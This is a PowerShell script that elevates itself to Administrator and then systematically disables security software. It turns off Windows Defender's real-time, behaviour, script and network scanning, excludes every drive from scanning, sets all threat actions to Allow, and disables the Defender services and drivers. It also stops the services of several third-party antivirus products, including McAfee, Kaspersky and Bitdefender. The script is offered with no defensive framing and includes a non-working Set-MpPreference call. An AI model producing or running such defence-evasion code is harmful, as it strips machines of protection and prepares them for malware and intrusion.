# Define log file path
$logFile = ".\log.txt"

# Clear log file
Clear-Content $logFile

# Function to write log entries
function LogWrite {
    Param ([string]$logstring)
    Add-Content $logFile -value "$(Get-Date) - $logstring"
}

# Start script execution log
LogWrite "Starting script execution"

# Check if running as Administrator
if (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
    LogWrite "Elevating to Administrator"
    $CommandLine = "-ExecutionPolicy Bypass `"$($MyInvocation.MyCommand.Path)`""
    Start-Process -FilePath PowerShell.exe -Verb Runas -ArgumentList $CommandLine
    Exit
}

# Import Defender module
Import-Module Defender

# Disable Windows Defender realtime monitoring
Set-MpPreference -DisableRealtimeMonitoring $true
LogWrite "Disabled Windows Defender realtime monitoring"

# Disable Windows Defender AntiSpyware
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force
LogWrite "Disabled Windows Defender AntiSpyware"

# Stop and disable Windows Defender services
Stop-Service -Name WinDefend
Set-Service -Name WinDefend -StartupType Disabled
LogWrite "Stopped and disabled Windows Defender services"

# Define list of drive letters to exclude from Windows Defender
67..90 | foreach-object {
    $drive = [char]$_
    if (Test-Path "$($drive):") {
        Add-MpPreference -ExclusionPath "$($drive):\" -ErrorAction SilentlyContinue
        Add-MpPreference -ExclusionProcess "$($drive):\*" -ErrorAction SilentlyContinue
    }
}
LogWrite "Excluded drive letters from Windows Defender scanning"

# Configure various Windows Defender preferences
$preferences = @(
    "DisableArchiveScanning",
    "DisableBehaviorMonitoring",
    "DisableIntrusionPreventionSystem",
    "DisableIOAVProtection",
    "DisableRemovableDriveScanning",
    "DisableBlockAtFirstSeen",
    "DisableScanningMappedNetworkDrivesForFullScan",
    "DisableScanningNetworkFiles",
    "DisableScriptScanning"
)
foreach ($pref in $preferences) {
    Set-MpPreference -Name $pref -Value 1 -ErrorAction SilentlyContinue
    LogWrite "Disabled $pref"
}

# Configure default actions for threat levels
Set-MpPreference -LowThreatDefaultAction Allow -ErrorAction SilentlyContinue
Set-MpPreference -ModerateThreatDefaultAction Allow -ErrorAction SilentlyContinue
Set-MpPreference -HighThreatDefaultAction Allow -ErrorAction SilentlyContinue
LogWrite "Set default threat action to Allow for all threat levels"

# List of Windows Defender services and drivers to disable
$svc_list = @("WdNisSvc", "WinDefend", "Sense")
$drv_list = @("WdnisDrv", "wdfilter", "wdboot")

foreach ($svc in $svc_list) {
    if (Test-Path "HKLM:\SYSTEM\CurrentControlSet\Services\$svc") {
        if ($(Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\$svc").Start -eq 4) {
            LogWrite "Service $svc is already disabled"
        } else {
            LogWrite "Disabling service $svc (next reboot)"
            Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\$svc" -Name Start -Value 4
            $need_reboot = $true
        }
    } else {
        LogWrite "Service $svc is already deleted"
    }
}

foreach ($drv in $drv_list) {
    if (Test-Path "HKLM:\SYSTEM\CurrentControlSet\Services\$drv") {
        if ($(Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\$drv").Start -eq 4) {
            LogWrite "Driver $drv is already disabled"
        } else {
            LogWrite "Disabling driver $drv (next reboot)"
            Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\$drv" -Name Start -Value 4
            $need_reboot = $true
        }
    } else {
        LogWrite "Driver $drv is already deleted"
    }
}

# Check if Windows Defender service is still running
if ($(Get-Service -Name WinDefend).Status -eq "Running") {
    LogWrite "Windows Defender service is still running (reboot required)"
    $need_reboot = $true
} else {
    LogWrite "Windows Defender service is not running"
}

# Log completion of script execution
LogWrite "Script execution completed"

# List of common antivirus services to stop and disable
$antivirusServices = @(
    "MsMpSvc",              # Windows Defender
    "WinDefend",            # Windows Defender
    "McAfeeEngineService",  # McAfee
    "Sophos",
    "avgsvc",
    "avast! Antivirus",
    "AVP",                  # Kaspersky
    "Norton",
    "BullGuard",
    "Bitdefender"
)

# Stop and disable each antivirus service
foreach ($service in $antivirusServices) {
    if (Get-Service -Name $service -ErrorAction SilentlyContinue) {
        Stop-Service -Name $service -Force
        Set-Service -Name $service -StartupType Disabled
    } else {
        LogWrite "Service $service not found"
    }
}

# Additional complexity and features can be added here
